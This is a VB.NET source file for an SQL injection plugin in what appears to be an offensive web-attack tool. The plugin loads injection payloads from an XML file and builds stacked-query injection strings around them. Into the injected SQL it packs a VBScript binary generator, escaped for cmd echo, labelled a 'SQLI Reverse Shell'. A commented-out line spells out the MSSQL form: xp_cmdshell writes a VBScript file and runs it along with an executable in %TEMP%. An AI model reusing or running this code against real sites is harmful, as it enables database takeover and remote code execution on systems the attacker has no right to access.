Imports System.ComponentModel.Composition
Imports WebRaider.Plugins.Raider
Imports WebRaider.SharedLibrary
Imports System.Xml.Linq

<Export(GetType(IRaider))> _
Public Class SQLI
    Implements IRaider

 

    Public ReadOnly Property Name() As String Implements IRaider.Name
        Get
            Return "SQL Injection"
        End Get
    End Property

    Public Function PrepareAttack(ByVal link As Link, ByVal param As Parameter, ByVal attackPattern As AttackPattern) As Boolean Implements WebRaider.Plugins.Raider.IRaider.PrepareAttack

        param.Value = attackPattern.Pattern
        param.UrlEncode()
        link.UriManager.AddParameter(param)

        Return True
    End Function
    Dim _Payloads As List(Of SQLPayload)
    Dim _AttackPatterns As List(Of AttackPattern)


    Public ReadOnly Property Attacks() As System.Collections.Generic.List(Of AttackPattern) Implements WebRaider.Plugins.Raider.IRaider.Attacks
        Get
            Return _AttackPatterns
        End Get
    End Property

    Public Sub Setup() Implements WebRaider.Plugins.Raider.IRaider.Setup

        _Payloads = New List(Of SQLPayload)()

        Dim doc = XDocument.Load("payloads.xml")
        _Payloads.Clear()
        For Each payload In doc.<xml>.<payload>
            Dim newPayload As New SQLPayload
            newPayload.Name = payload.@name
            newPayload.Payload = payload.<attack>.Value
            If Not payload.<attack>.@encoded = "true" Then
                newPayload.IsEncoded = False
            Else
                newPayload.IsEncoded = True
            End If

            If payload.<attack>.@consoleencoding = "true" Then
                newPayload.ConsoleEncoding = True
            Else
                newPayload.ConsoleEncoding = False
            End If

            _Payloads.Add(newPayload)

            If Not Options.Payloads.Contains(newPayload.Name) Then
                Options.Payloads.Add(newPayload.Name)
            End If

        Next

        _AttackPatterns = New List(Of AttackPattern)(1)
        _AttackPatterns.Add(New AttackPattern("SQLI Reverse Shell", GetPayload(WebRaider.SharedLibrary.Options.GroupNumber, WebRaider.SharedLibrary.Options.ParameterType.ToString(), WebRaider.SharedLibrary.Options.SelectedPayload)))
    End Sub

    Public Function GetPayload(Optional ByVal groupNumber As Integer = 0, Optional ByVal ParamType As String = "Integer", Optional ByVal payloadName As String = "") As String

        Dim currentPayload As String = My.Computer.FileSystem.ReadAllText(My.Application.Info.DirectoryPath & "\Utilities\GenerateBinary-Generated.packed.vbs")
        Dim attackPayloads = From payload In _Payloads Where payload.Name = payloadName
        Dim attackPayload = attackPayloads.ElementAt(0)
        Dim entry As String = ""

        attackPayload.Payload = attackPayload.Payload.Replace("{PAYLOAD}", "{0}")
        If attackPayload.IsEncoded = True Then attackPayload.Payload = System.Web.HttpUtility.UrlDecode(attackPayload.Payload)

        If attackPayload.Name.ToLower.Contains("mssql") Then
            If (ParamType = "Str") Then
                entry = "1'"
            Else
                entry = "1"
            End If

            For i = 0 To groupNumber - 1
                entry += ")"
            Next
            entry += ";"
        Else
            If ParamType = "Str" Then
                entry = "1' and "
            Else
                entry = "1 and "
            End If
        End If
        If attackPayload.ConsoleEncoding Then
            currentPayload = String.Format("{1}" + attackPayload.Payload, EscapeEcho(currentPayload), entry.ToString)
        Else
            currentPayload = String.Format("{1}" + attackPayload.Payload, currentPayload, entry.ToString)
        End If

        'Select Case Db
        '    Case Options.Database.MSSQL
        '        Payload = String.Format("{1};exec master..xp_cmdshell 'echo {0}>p.vbs && p.vbs && %TEMP%\wr.exe';--", EscapeEcho(Payload), entry.ToString)
        '    Case Options.Database.ORACLE
        '        Payload = String.Format("{1};exec master..xp_cmdshell 'echo {0}>p.vbs && p.vbs && %TEMP%\wr.exe';--", EscapeEcho(Payload), entry.ToString)
        'End Select


        Return currentPayload
    End Function


    ''' <summary>
    ''' Characters need to be escaped in Echo
    ''' Character order matters, be careful while changing it!
    ''' </summary>
    ''' <remarks></remarks>
    Dim EchoChars() As String = {"^", "^^", "<<", "^<<", ">>", "^>>", "<", "^<", ">", "^>", " &", " ^&", "|", "^|", "(", "^(", ")", "^)"}

    ''' <summary>
    ''' Escapes the scpecial chars for Echo.
    ''' </summary>
    ''' <param name="command">The command.</param>
    ''' <returns></returns>
    Function EscapeEcho(ByVal command As String) As String
        For i As Integer = 0 To EchoChars.Length - 1 Step 2
            command = command.Replace(EchoChars(i), EchoChars(i + 1))
        Next

        Return command
    End Function

    Private _Enabled As Boolean
    Public Property Enabled() As Boolean Implements WebRaider.Plugins.Raider.IRaider.Enabled
        Get
            Return _Enabled
        End Get
        Set(ByVal value As Boolean)
            _Enabled = value
        End Set
    End Property
End Class

